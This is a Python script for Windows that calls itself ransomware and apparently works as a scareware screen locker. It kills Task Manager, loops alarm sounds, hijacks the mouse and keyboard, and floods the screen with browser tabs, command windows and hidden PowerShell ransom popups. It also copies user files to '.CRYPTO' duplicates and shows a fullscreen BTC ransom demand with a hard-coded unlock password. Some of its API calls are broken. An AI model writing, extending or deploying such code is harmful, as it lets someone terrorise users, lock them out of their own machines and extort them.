import os
import shutil
import time
import threading
import tkinter as tk
from tkinter import messagebox
import webbrowser
import subprocess
import random
import winsound
from datetime import datetime
import ctypes
from ctypes import wintypes

# ==== NO EXTERNAL DEPENDENCIES - PURE PYTHON ====
desktop = os.path.join(os.path.expanduser("~"), "Desktop")
PASSWORD = "8846"
system_locked = False
attack_threads = []

# Windows API imports
user32 = ctypes.windll.user32
kernel32 = ctypes.windll.kernel32

def kill_taskmgr():
    """Kill Task Manager using taskkill"""
    try:
        subprocess.Popen(['taskkill', '/f', '/im', 'taskmgr.exe'], 
                        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except:
        pass

def sound_hell():
    """Maximum audio torture - NO DEPENDENCIES"""
    def alarm_loop():
        while system_locked:
            try:
                # Windows error sound loop
                winsound.PlaySound("SystemExclamation", winsound.SND_ASYNC | winsound.SND_LOOP)
            except:
                # Pure beep hell
                freqs = [800, 1000, 1200, 1500, 2000]
                for _ in range(20):
                    winsound.Beep(random.choice(freqs), 150)
            time.sleep(0.1)
    
    t = threading.Thread(target=alarm_loop, daemon=True)
    t.start()
    attack_threads.append(t)

def mouse_keyboard_chaos():
    """Random mouse + keyboard spam"""
    def chaos_loop():
        while system_locked:
            # Wild mouse movement
            x = random.randint(-500, 2500)
            y = random.randint(-500, 1500)
            user32.SetCursorPos(x, y)
            
            # Keyboard spam A-Z
            vk_codes = list(range(0x41, 0x5B))  # A-Z
            vk = random.choice(vk_codes)
            kernel32.keybd_event(vk, 0, 0, 0)
            kernel32.keybd_event(vk, 0, 2, 0)  # Key up
            
            time.sleep(0.03)  # Ultra fast
    
    t = threading.Thread(target=chaos_loop, daemon=True)
    t.start()
    attack_threads.append(t)

def browser_hell():
    """Spawn 100+ tabs"""
    def tab_spam():
        rickroll = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
        urls = [rickroll, "https://google.com", "about:blank"] * 34
        
        for url in urls:
            try:
                webbrowser.open(url)
                time.sleep(0.05)
            except:
                pass
    
    t = threading.Thread(target=tab_spam, daemon=True)
    t.start()
    attack_threads.append(t)

def recursive_encryption():
    """Encrypt entire system - copies files"""
    log_file = os.path.join(desktop, "ENCRYPTED_FILES.txt")
    
    def encrypt_tree(root_dir):
        count = 0
        for root, dirs, files in os.walk(root_dir):
            for file in files[:50]:  # Limit per folder
                if '.' in file and not file.endswith('.CRYPTO'):
                    source = os.path.join(root, file)
                    encrypted = source + '.CRYPTO'
                    try:
                        shutil.copy2(source, encrypted)
                        with open(log_file, "a") as f:
                            f.write(f"ENCRYPTED: {source}\n")
                        count += 1
                    except:
                        pass
            if count > 1000:  # Safety limit
                break
            time.sleep(0.01)
    
    targets = [
        desktop,
        os.path.join(os.path.expanduser("~"), "Documents"),
        os.path.join(os.path.expanduser("~"), "Downloads"),
        os.path.join(os.path.expanduser("~"), "Pictures")
    ]
    
    for target in targets:
        threading.Thread(target=encrypt_tree, args=(target,), daemon=True).start()

def notification_nightmare():
    """Windows popup spam"""
    def notify_spam():
        while system_locked:
            try:
                subprocess.Popen([
                    'powershell', '-WindowStyle', 'Hidden', '-Command',
                    '[System.Windows.Forms.NotificationIcon]::ShowBalloonTip("RANSOMWARE", "PAY OR LOSE EVERYTHING", "URGENT")'
                ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            except:
                pass
            time.sleep(1.5)
    
    t = threading.Thread(target=notify_spam, daemon=True)
    t.start()
    attack_threads.append(t)

def cmd_spam():
    """Open hundreds of CMD windows"""
    def cmd_flood():
        messages = ["YOU ARE HACKED", "PAY RANSOM NOW", "FILES DELETED"]
        for i in range(100):
            try:
                subprocess.Popen(['cmd', '/c', f'color 4F & echo {random.choice(messages)} & timeout 3 & exit'], 
                               creationflags=subprocess.CREATE_NO_WINDOW)
            except:
                pass
            time.sleep(0.02)
    
    t = threading.Thread(target=cmd_flood, daemon=True)
    t.start()
    attack_threads.append(t)

def ULTIMATE_DEATH_SCREEN():
    """Flashing fullscreen nightmare"""
    root = tk.Tk()
    root.title("TERMINAL RANSOMWARE v3.0")
    root.attributes('-fullscreen', True)
    root.attributes('-topmost', True)
    root.configure(bg='black')
    root.overrideredirect(True)
    
    # Matrix-style flashing
    def matrix_flash():
        colors = ['#FF0000', '#000000', '#8B0000', '#FF4500']
        i = 0
        while system_locked:
            root.configure(bg=colors[i % len(colors)])
            root.update()
            i += 1
            time.sleep(0.15)
    
    flash_t = threading.Thread(target=matrix_flash, daemon=True)
    flash_t.start()
    
    # Huge glitchy text
    title = tk.Label(root, text="💀 SYSTEM TERMINATED 💀", 
                     font=("Consolas", 80, "bold"), fg="#FF0000", bg="black")
    title.place(relx=0.5, rely=0.15, anchor='center')
    
    counter = tk.Label(root, text="COUNTDOWN: 00:00", 
                       font=("Digital-7", 48, "bold"), fg="#00FF00", bg="black")
    counter.place(relx=0.5, rely=0.35, anchor='center')
    
    # Fake countdown
    def countdown():
        for i in range(999, -1, -1):
            if not system_locked:
                break
            mins, secs = divmod(i, 60)
            counter.config(text=f"COUNTDOWN: {mins:02d}:{secs:02d}")
            root.update()
            time.sleep(1)
    
    threading.Thread(target=countdown, daemon=True).start()
    
    msg = tk.Label(root, text="1.2TB ENCRYPTED\nPAY 0.5 BTC OR DATA DELETED\nENTER RANSOM KEY:", 
                   font=("Consolas", 24, "bold"), fg="#FFFF00", bg="black", justify='center')
    msg.place(relx=0.5, rely=0.55, anchor='center', width=1200)
    
    entry = tk.Entry(root, font=("Consolas", 28), show="🔒", width=25, justify='center')
    entry.place(relx=0.5, rely=0.75, anchor='center')
    entry.focus()
    
    def unlock():
        if entry.get() == PASSWORD:
            global system_locked
            system_locked = False
            root.destroy()
            print("\n🎉 UNLOCKED! Password was 8846 🎉")
            print("Kill all python.exe processes to fully stop.")
        else:
            entry.delete(0, tk.END)
            messagebox.showerror("ACCESS DENIED", "WRONG KEY! 48 HOURS ADDED!", parent=root)
    
    btn = tk.Button(root, text="DECRYPT FILES", font=("Consolas", 32, "bold"),
                    command=unlock, bg="#FF0000", fg="white")
    btn.place(relx=0.5, rely=0.9, anchor='center')
    
    root.bind('<Return>', lambda e: unlock())
    root.mainloop()

# ==== TOTAL ANNIHILATION ====
def DEPLOY_APOCALYPSE():
    global system_locked
    print("🌋 APOCALYPSE MODE ACTIVATED 🌋")
    print("Password: 8846")
    print("Ctrl+C or Task Manager IMMEDIATELY if testing!")
    
    system_locked = True
    
    # Full attack wave
    kill_taskmgr()
    sound_hell()
    mouse_keyboard_chaos()
    browser_hell()
    recursive_encryption()
    notification_nightmare()
    cmd_spam()
    
    ULTIMATE_DEATH_SCREEN()

if __name__ == "__main__":
    print("💀 HARDCOR RANSOMWARE v4.0 - NO DEPENDENCIES 💀")
    choice = input("LAUNCH APOCALYPSE? (y/n): ").lower()
    if choice == 'y':
        DEPLOY_APOCALYPSE()
    else:
        print("Aborted.")